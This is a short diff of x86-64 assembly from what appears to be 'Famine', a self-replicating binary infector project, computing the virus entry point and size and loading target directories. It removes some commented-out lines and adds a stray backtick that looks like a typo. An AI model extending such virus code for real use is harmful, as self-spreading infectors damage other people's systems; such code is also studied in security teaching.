@@ -20,16 +20,11 @@ section .text
     mov VAR(Famine.virus_entry), rax
 
     ; load virus size
-
     lea rax, _start
     lea rbx, _finish
     sub rbx, rax
     mov VAR(Famine.virus_size), rbx
-
-    ; xor rax, rax
-    ; mov VAR(Famine.truncate_flag), rax
-    
-    ;load virus entry
+`
     ;load dirs
     lea rdi, [dirs]
 
